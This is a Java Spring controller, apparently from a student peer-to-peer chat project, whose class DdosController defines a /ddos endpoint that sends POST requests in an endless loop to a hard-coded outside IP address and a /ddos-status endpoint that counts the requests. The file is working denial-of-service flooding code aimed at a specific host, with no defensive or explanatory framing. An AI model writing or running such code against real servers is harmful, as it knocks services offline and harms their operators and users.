package com.gfa.p2p_chat.controllers;

import com.gfa.p2p_chat.models.Message;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpMethod;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.client.RestTemplate;

@Controller
public class DdosController {

  RestTemplate restTemplate = new RestTemplate();

  int i =0;
  @Async
  @GetMapping("/ddos")
  public void ddosAttack(){
    while (true){
      i++;
      HttpEntity<Message> httpEntity = new HttpEntity<>(new Message(i,null,null,1));
      restTemplate.exchange("http://188.157.220.94/api/message/receive", HttpMethod.POST,httpEntity,Message.class);
    }
  }

  @GetMapping("/ddos-status")
  @ResponseBody
  public String displayDdosStatus(){
    return "ddos iteration " + i;
  }
}
